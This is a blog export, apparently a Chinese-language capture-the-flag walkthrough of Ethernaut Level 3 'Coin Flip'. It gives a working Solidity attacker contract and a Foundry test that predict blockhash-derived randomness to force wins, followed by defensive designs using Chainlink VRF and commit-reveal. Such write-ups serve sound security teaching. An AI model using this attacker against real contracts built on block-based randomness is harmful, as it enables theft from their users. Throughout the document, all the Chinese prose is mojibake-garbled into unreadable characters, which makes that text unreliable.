revealFlip(bool _guess, uint256 _nonce) public {\n        Game storage game = games[msg.sender];\n        \n        require(block.number >= game.revealBlock, \"Too early to reveal\");\n        require(!game.revealed, \"Already revealed\");\n        \n        // éªŒè¯æ‰¿è¯º\n        bytes32 hash = keccak256(abi.encodePacked(_guess, _nonce, msg.sender));\n        require(hash == game.commitment, \"Invalid commitment\");\n        \n        // ä½¿ç”¨æœªæ¥åŒºå—å“ˆå¸Œ\n        uint256 futureBlockHash = uint256(blockhash(game.revealBlock));\n        bool result = (futureBlockHash % 2) == 1;\n        \n        game.revealed = true;\n        \n        // å¤„ç†ç»“æœ...\n    }\n}\n```\n\n### 3. å¤šæºç†µç»„åˆ\n\n```solidity\ncontract MultiSourceRandom {\n    uint256 private nonce;\n    \n    function getRandomNumber() private returns (uint256) {\n        // âš ï¸ ä»ä¸å¤Ÿå®‰å…¨ï¼Œä»…ä½œæ•™å­¦ç¤ºä¾‹\n        nonce++;\n        return uint256(keccak256(abi.encodePacked(\n            block.difficulty,    // çŸ¿å·¥å¯æ“æ§\n            block.timestamp,     // çŸ¿å·¥å¯å°å¹…æ“æ§\n            msg.sender,\n            nonce,\n            blockhash(block.number - 1)\n        )));\n    }\n}\n```\n\n## ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\n\n### 1. åŒºå—é“¾éšæœºæ•°å¸¸è§è¯¯åŒº\n\n| æ•°æ®æº | å®‰å…¨æ€§ | æ“æ§éš¾åº¦ | æ¨èä½¿ç”¨ |\n|--------|---------|----------|----------|\n| `block.timestamp` | âŒ æä½ | å®¹æ˜“ | å¦ |\n| `block.difficulty` | âŒ ä½ | ä¸­ç­‰ | å¦ |\n| `blockhash` | âŒ ä½ | å›°éš¾ | å¦ |\n| `keccak256(ç»„åˆ)` | âŒ ä½ | å–å†³äºç»„åˆ | å¦ |\n| **Chainlink VRF** | âœ… é«˜ | æå›°éš¾ | **æ˜¯** |\n\n### 2. æ”»å‡»è€…çš„ä¼˜åŠ¿\n\n```solidity\n// æ”»å‡»è€…å¯ä»¥ï¼š\n// 1. åœ¨åŒä¸€äº¤æ˜“ä¸­æ‰§è¡Œç›¸åŒè®¡ç®—\n// 2. é¢„å…ˆéªŒè¯ç»“æœï¼Œåªåœ¨æœ‰åˆ©æ—¶æäº¤\n// 3. ä½¿ç”¨åˆçº¦è‡ªåŠ¨åŒ–æ”»å‡»\n\ncontract SmartAttacker {\n    function conditionalAttack(CoinFlip target, bool guess) public {\n        // é¢„å…ˆè®¡ç®—\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        uint256 coinFlip = blockValue / FACTOR;\n        bool predictedSide = coinFlip == 1 ? true : false;\n        \n        // åªåœ¨é¢„æµ‹æ­£ç¡®æ—¶æ‰æ”»å‡»\n        if (predictedSide == guess) {\n            target.flip(guess);\n        }\n        // å¦åˆ™ä»€ä¹ˆéƒ½ä¸åšï¼Œç­‰å¾…ä¸‹ä¸€ä¸ªæœ‰åˆ©æœºä¼š\n    }\n}\n```\n\n### 3. çœŸéšæœºæ•° vs ä¼ªéšæœºæ•°\n\n```solidity\n// âŒ ä¼ªéšæœºæ•°ï¼ˆç¡®å®šæ€§ï¼‰\nfunction badRandom() public view returns (uint256) {\n    return uint256(keccak256(abi.encodePacked(\n        block.timestamp,\n        block.difficulty,\n        msg.sender\n    )));\n}\n\n// âœ… çœŸéšæœºæ•°ï¼ˆä½¿ç”¨é¢„è¨€æœºï¼‰\nfunction goodRandom() public {\n    // é€šè¿‡ Chainlink VRF è¯·æ±‚çœŸæ­£çš„éšæœºæ•°\n    requestRandomness(keyHash, fee);\n}\n```\n\n## ğŸ›ï¸ å†å²æ¡ˆä¾‹\n\n### è‘—åçš„éšæœºæ•°æ”»å‡»äº‹ä»¶\n\n1. **SmartBillions** (2017)\n   - æŸå¤±: 400 ETH\n   - åŸå› : ä½¿ç”¨ `block.blockhash` ä½œä¸ºéšæœºæº\n   - æ”»å‡»: é¢„æµ‹æœªæ¥åŒºå—å“ˆå¸Œ\n\n2. **Fomo3D** (2018)\n   - å½±å“: æ¸¸æˆæœºåˆ¶è¢«æ“æ§\n   - åŸå› : ä½¿ç”¨å¯é¢„æµ‹çš„æ—¶é—´æˆ³\n   - åæœ: å¥–æ± åˆ†é…ä¸å…¬\n\n3. **TheRun** (2019)\n   - æŸå¤±: å¤§é‡ä»£å¸\n   - åŸå› : å¤æ‚ä½†ä»å¯é¢„æµ‹çš„éšæœºæ•°ç®—æ³•\n\n## ğŸ¯ æ€»ç»“\n\nCoin Flip å…³å¡æ­ç¤ºäº†åŒºå—é“¾éšæœºæ•°çš„æ ¹æœ¬é—®é¢˜ï¼š\n\n- âœ… **åŒºå—é“¾æ˜¯ç¡®å®šæ€§ç³»ç»Ÿ** - ç›¸åŒè¾“å…¥å¿…ç„¶äº§ç”Ÿç›¸åŒè¾“å‡º\n- âœ… **é€æ˜æ€§å¸¦æ¥å¯é¢„æµ‹æ€§** - æ‰€æœ‰æ•°æ®éƒ½æ˜¯å…¬å¼€çš„\n- âœ… **çœŸéšæœºæ•°éœ€è¦å¤–éƒ¨ç†µæº** - å¿…é¡»ä¾èµ–é“¾ä¸‹éšæœºæ€§\n- âœ… **é¢„è¨€æœºæ˜¯æœ€ä½³è§£å†³æ–¹æ¡ˆ** - Chainlink VRF ç­‰æœåŠ¡\n\nè¿™ä¸ªçœ‹ä¼¼ç®€å•çš„çŒœç¡¬å¸æ¸¸æˆï¼Œå®é™…ä¸Šæ¶‰åŠå¯†ç å­¦ã€æ¦‚ç‡è®ºå’Œåˆ†å¸ƒå¼ç³»ç»Ÿçš„æ·±å±‚æ¦‚å¿µã€‚ç†è§£å…¶åŸç†å¯¹äºæ„å»ºå®‰å…¨çš„æ™ºèƒ½åˆçº¦è‡³å…³é‡è¦ã€‚\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ä¸Šä¸€å…³: Level 2 - Fallout](/2025/01/25/ethernaut-level-02-fallout/)**\n- **[ä¸‹ä¸€å…³: Level 4 - Telephone](/2025/01/25/ethernaut-level-04-telephone/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[Chainlink VRF æ–‡æ¡£](https://docs.chain.link/vrf/v2/introduction)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*åœ¨åŒºå—é“¾çš„ç¡®å®šæ€§ä¸–ç•Œä¸­ï¼ŒçœŸæ­£çš„éšæœºæ€§æ˜¯ä¸€ç§çè´µçš„èµ„æºã€‚* ğŸ²","slug":"ethernaut-level-03-coinflip","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zboz000bbf5q1cnt9xhl","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-3-Coin-Flip-ä¼ªéšæœºæ•°æ”»å‡»è¯¦è§£\"><a href=\"#ğŸ¯-Ethernaut-Level-3-Coin-Flip-ä¼ªéšæœºæ•°æ”»å‡»è¯¦è§£\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 3: Coin Flip - ä¼ªéšæœºæ•°æ”»å‡»è¯¦è§£\"></a>ğŸ¯ Ethernaut Level 3: Coin Flip - ä¼ªéšæœºæ•°æ”»å‡»è¯¦è§£</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/3\">Ethernaut Level 3 - Coin Flip</a><br><strong>æ”»å‡»ç±»å‹</strong>: ä¼ªéšæœºæ•°é¢„æµ‹æ”»å‡»<br><strong>éš¾åº¦</strong>: â­â­â­â˜†â˜†<br><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>: åŒºå—é“¾ç¡®å®šæ€§ã€å¯é¢„æµ‹æ€§</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è¿™ä¸ªå…³å¡è€ƒéªŒå¯¹åŒºå—é“¾éšæœºæ•°æœºåˆ¶çš„ç†è§£ï¼š</p>\n<ol>\n<li><strong>è¿ç»­çŒœå¯¹10æ¬¡</strong> - è¿ç»­æ­£ç¡®é¢„æµ‹ç¡¬å¸æ­£åé¢</li>\n<li><strong>ç†è§£ä¼ªéšæœºæ•°</strong> - æŒæ¡åŒºå—é“¾â€éšæœºæ•°â€çš„æœ¬è´¨</li>\n<li><strong>å­¦ä¹ é¢„æµ‹æŠ€æœ¯</strong> - åˆ©ç”¨åŒºå—é“¾çš„ç¡®å®šæ€§è¿›è¡Œæ”»å‡»</li>\n</ol>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"åˆçº¦æºç åˆ†æ\"><a href=\"#åˆçº¦æºç åˆ†æ\" class=\"headerlink\" title=\"åˆçº¦æºç åˆ†æ\"></a>åˆçº¦æºç åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract CoinFlip &#123;</span><br><span class=\"line\">  uint256 public consecutiveWins;</span><br><span class=\"line\">  uint256 lastHash;</span><br><span class=\"line\">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class=\"line\"></span><br><span class=\"line\">  constructor() &#123;</span><br><span class=\"line\">    consecutiveWins = 0;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class=\"line\">    // ğŸš¨ å…³é”®æ¼æ´ï¼šä½¿ç”¨å¯é¢„æµ‹çš„åŒºå—å“ˆå¸Œ</span><br><span class=\"line\">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">    </span><br><span class=\"line\">    if (lastHash == blockValue) &#123;</span><br><span class=\"line\">      revert();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    lastHash = blockValue;</span><br><span class=\"line\">    // ğŸš¨ ä¼ªéšæœºæ•°ç”Ÿæˆé€»è¾‘</span><br><span class=\"line\">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">    bool side = coinFlip == 1 ? true : false;</span><br><span class=\"line\"></span><br><span class=\"line\">    if (side == _guess) &#123;</span><br><span class=\"line\">      consecutiveWins++;</span><br><span class=\"line\">      return true;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">      consecutiveWins = 0;</span><br><span class=\"line\">      return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ¼æ´è¯†åˆ«\"><a href=\"#æ¼æ´è¯†åˆ«\" class=\"headerlink\" title=\"æ¼æ´è¯†åˆ«\"></a>æ¼æ´è¯†åˆ«</h3><p><strong>ä¼ªéšæœºæ•°çš„æ ¹æœ¬ç¼ºé™·</strong>ï¼š</p>\n<ol>\n<li><strong>æ•°æ®æºå¯é¢„æµ‹</strong> - <code>blockhash(block.number - 1)</code> æ˜¯å…¬å¼€å¯æŸ¥çš„</li>\n<li><strong>ç®—æ³•é€æ˜</strong> - éšæœºæ•°ç”Ÿæˆç®—æ³•å®Œå…¨å…¬å¼€</li>\n<li><strong>ç¡®å®šæ€§è®¡ç®—</strong> - ç›¸åŒè¾“å…¥å¿…ç„¶äº§ç”Ÿç›¸åŒè¾“å‡º</li>\n</ol>\n<p><strong>æ”»å‡»åŸç†</strong>ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// åˆçº¦ä½¿ç”¨çš„&quot;éšæœºæ•°&quot;ç”Ÿæˆ</span><br><span class=\"line\">uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">bool side = coinFlip == 1 ? true : false;</span><br><span class=\"line\"></span><br><span class=\"line\">// æ”»å‡»è€…å¯ä»¥åœ¨åŒä¸€ä¸ªåŒºå—å†…æ‰§è¡Œç›¸åŒè®¡ç®—</span><br><span class=\"line\">// ç”±äºä½¿ç”¨ç›¸åŒçš„ blockhashï¼Œç»“æœå¿…ç„¶ç›¸åŒï¼</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ”»å‡»æµç¨‹\"><a href=\"#æ”»å‡»æµç¨‹\" class=\"headerlink\" title=\"æ”»å‡»æµç¨‹\"></a>æ”»å‡»æµç¨‹</h3><ol>\n<li><strong>è·å–å½“å‰åŒºå—å“ˆå¸Œ</strong> - è¯»å– <code>blockhash(block.number - 1)</code></li>\n<li><strong>æ‰§è¡Œç›¸åŒè®¡ç®—</strong> - ä½¿ç”¨ç›¸åŒçš„ç®—æ³•è®¡ç®—ç»“æœ</li>\n<li><strong>æå‰çŸ¥é“ç­”æ¡ˆ</strong> - åœ¨è°ƒç”¨ <code>flip()</code> å‰å°±çŸ¥é“æ­£ç¡®ç­”æ¡ˆ</li>\n<li><strong>æäº¤æ­£ç¡®çŒœæµ‹</strong> - ä¿è¯100%èƒœç‡</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/CoinFlip.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract CoinFlipAttacker &#123;</span><br><span class=\"line\">    CoinFlip public target;</span><br><span class=\"line\">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(address _target) &#123;</span><br><span class=\"line\">        target = CoinFlip(_target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function attack() public &#123;</span><br><span class=\"line\">        // ğŸ¯ å…³é”®ï¼šåœ¨åŒä¸€åŒºå—å†…æ‰§è¡Œç›¸åŒçš„è®¡ç®—</span><br><span class=\"line\">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">        bool side = coinFlip == 1 ? true : false;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æäº¤é¢„å…ˆè®¡ç®—å¥½çš„ç­”æ¡ˆ</span><br><span class=\"line\">        target.flip(side);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract CoinFlipTest is Test &#123;</span><br><span class=\"line\">    CoinFlip public coinFlip;</span><br><span class=\"line\">    CoinFlipAttacker public attacker;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public attackerAddr = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // éƒ¨ç½²ç›®æ ‡åˆçº¦</span><br><span class=\"line\">        coinFlip = new CoinFlip();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½²æ”»å‡»åˆçº¦</span><br><span class=\"line\">        vm.prank(attackerAddr);</span><br><span class=\"line\">        attacker = new CoinFlipAttacker(address(coinFlip));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testCoinFlipExploit() public &#123;</span><br><span class=\"line\">        console.log(&quot;Initial consecutive wins:&quot;, coinFlip.consecutiveWins());</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attackerAddr);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // è¿ç»­æ”»å‡»10æ¬¡ä»¥è·å¾—10è¿èƒœ</span><br><span class=\"line\">        for (uint i = 0; i &lt; 10; i++) &#123;</span><br><span class=\"line\">            // æ¨¡æ‹Ÿæ–°åŒºå—ï¼ˆæ¯æ¬¡æ”»å‡»éƒ½åœ¨æ–°åŒºå—è¿›è¡Œï¼‰</span><br><span class=\"line\">            vm.roll(block.number + 1);</span><br><span class=\"line\">            </span><br><span class=\"line\">            uint256 winsBefore = coinFlip.consecutiveWins();</span><br><span class=\"line\">            attacker.attack();</span><br><span class=\"line\">            uint256 winsAfter = coinFlip.consecutiveWins();</span><br><span class=\"line\">            </span><br><span class=\"line\">            console.log(&quot;Round&quot;, i + 1, &quot;- Wins:&quot;, winsAfter);</span><br><span class=\"line\">            </span><br><span class=\"line\">            // éªŒè¯æ¯æ¬¡æ”»å‡»éƒ½æˆåŠŸ</span><br><span class=\"line\">            assertEq(winsAfter, winsBefore + 1);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æœ€ç»ˆè¾¾æˆ10è¿èƒœ</span><br><span class=\"line\">        assertEq(coinFlip.consecutiveWins(), 10);</span><br><span class=\"line\">        console.log(&quot;Attack successful! 10 consecutive wins achieved.&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testPredictability() public view &#123;</span><br><span class=\"line\">        // æ¼”ç¤ºéšæœºæ•°çš„å¯é¢„æµ‹æ€§</span><br><span class=\"line\">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class=\"line\">        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class=\"line\">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class=\"line\">        bool side = coinFlip == 1 ? true : false;</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;Block hash:&quot;, blockValue);</span><br><span class=\"line\">        console.log(&quot;Coin flip result:&quot;, side);</span><br><span class=\"line\">        console.log(&quot;This result is 100% predictable!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"è¿è¡Œæµ‹è¯•\"><a href=\"#è¿è¡Œæµ‹è¯•\" class=\"headerlink\" title=\"è¿è¡Œæµ‹è¯•\"></a>è¿è¡Œæµ‹è¯•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># è¿è¡Œ Coin Flip æ”»å‡»æµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract CoinFlipTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># é¢„æœŸè¾“å‡ºï¼š</span></span><br><span class=\"line\"><span class=\"comment\"># [PASS] testCoinFlipExploit()</span></span><br><span class=\"line\"><span class=\"comment\"># Round 1 - Wins: 1</span></span><br><span class=\"line\"><span class=\"comment\"># Round 2 - Wins: 2</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\"><span class=\"comment\"># Round 10 - Wins: 10</span></span><br><span class=\"line\"><span class=\"comment\"># Attack successful! 10 consecutive wins achieved.</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-ä½¿ç”¨-Chainlink-VRF-æ¨è\"><a href=\"#1-ä½¿ç”¨-Chainlink-VRF-æ¨è\" class=\"headerlink\" title=\"1. ä½¿ç”¨ Chainlink VRF (æ¨è)\"></a>1. ä½¿ç”¨ Chainlink VRF (æ¨è)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &quot;@chainlink/contracts/src/v0.8/interfaces/VRFCoordinatorV2Interface.sol&quot;;</span><br><span class=\"line\">import &quot;@chainlink/contracts/src/v0.8/VRFConsumerBaseV2.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SecureCoinFlip is VRFConsumerBaseV2 &#123;</span><br><span class=\"line\">    VRFCoordinatorV2Interface COORDINATOR;</span><br><span class=\"line\">    </span><br><span class=\"line\">    uint64 s_subscriptionId;</span><br><span class=\"line\">    bytes32 keyHash;</span><br><span class=\"line\">    uint32 callbackGasLimit = 100000;</span><br><span class=\"line\">    uint16 requestConfirmations = 3;</span><br><span class=\"line\">    uint32 numWords = 1;</span><br><span class=\"line\">    </span><br><span class=\"line\">    mapping(uint256 =&gt; address) public requestIdToSender;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(uint64 subscriptionId, address vrfCoordinator) </span><br><span class=\"line\">        VRFConsumerBaseV2(vrfCoordinator) &#123;</span><br><span class=\"line\">        COORDINATOR = VRFCoordinatorV2Interface(vrfCoordinator);</span><br><span class=\"line\">        s_subscriptionId = subscriptionId;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function flip(bool _guess) public &#123;</span><br><span class=\"line\">        // è¯·æ±‚çœŸæ­£çš„éšæœºæ•°</span><br><span class=\"line\">        uint256 requestId = COORDINATOR.requestRandomWords(</span><br><span class=\"line\">            keyHash,</span><br><span class=\"line\">            s_subscriptionId,</span><br><span class=\"line\">            requestConfirmations,</span><br><span class=\"line\">            callbackGasLimit,</span><br><span class=\"line\">            numWords</span><br><span class=\"line\">        );</span><br><span class=\"line\">        </span><br><span class=\"line\">        requestIdToSender[requestId] = msg.sender;</span><br><span class=\"line\">        // å­˜å‚¨ç”¨æˆ·çš„çŒœæµ‹...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) </span><br><span class=\"line\">        internal override &#123;</span><br><span class=\"line\">        // ä½¿ç”¨çœŸæ­£çš„éšæœºæ•°å¤„ç†ç»“æœ</span><br><span class=\"line\">        bool side = (randomWords[0] % 2) == 1;</span><br><span class=\"line\">        address sender = requestIdToSender[requestId];</span><br><span class=\"line\">        </span><br><span class=\"line\">        // å¤„ç†æ¸¸æˆé€»è¾‘...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-ä½¿ç”¨æœªæ¥åŒºå—å“ˆå¸Œ-æäº¤-æ­ç¤ºæ–¹æ¡ˆ\"><a href=\"#2-ä½¿ç”¨æœªæ¥åŒºå—å“ˆå¸Œ-æäº¤-æ­ç¤ºæ–¹æ¡ˆ\" class=\"headerlink\" title=\"2. ä½¿ç”¨æœªæ¥åŒºå—å“ˆå¸Œ + æäº¤-æ­ç¤ºæ–¹æ¡ˆ\"></a>2. ä½¿ç”¨æœªæ¥åŒºå—å“ˆå¸Œ + æäº¤-æ­ç¤ºæ–¹æ¡ˆ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span 